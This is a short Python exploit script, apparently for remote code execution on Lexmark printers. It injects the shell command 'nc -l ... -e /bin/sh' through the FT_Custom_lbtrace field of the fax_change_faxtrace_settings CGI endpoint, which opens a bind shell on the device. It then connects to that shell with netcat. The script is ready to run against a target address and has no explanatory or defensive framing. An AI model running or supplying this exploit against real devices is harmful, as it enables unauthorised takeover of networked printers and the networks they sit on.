#!/usr/bin/python3
import argparse
import os
import threading
import time
import urllib.parse
import requests


def get_shell(target, rport):
    print(f'[*] Connecting to lexmark {target}:{rport}...')
    os.system(f'nc -v {target} {rport}')


def send_payload(url, data):
    time.sleep(2)
    print(f'[*] Sending payload to server...')
    requests.post(url, verify=False, data=data)
    print('[*] Sent payload')


def exploit(target, rport):
    print(f'[*] Sending wakeup 1...')
    requests.get(f'http://{target}/', verify=False)
    
    print(f'[*] Sending wakeup 2...')
    requests.get(f'http://{target}/', verify=False)
    
    payload = f'nc -l {target}:{rport} -e /bin/sh'
    url = f'http://{target}/cgi-bin/fax_change_faxtrace_settings'
    data = f'FT_Custom_lbtrace=$({payload})'

    t = threading.Thread(target=send_payload, args=(url, data), daemon=True)
    t.start()

    return t


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-p', '--rport', help='The port to bind', default=8080)
    args = parser.parse_args()

    exploit_thread = exploit(args.target, args.rport)

    exploit_thread.join()
    
    get_shell(args.target, args.rport)
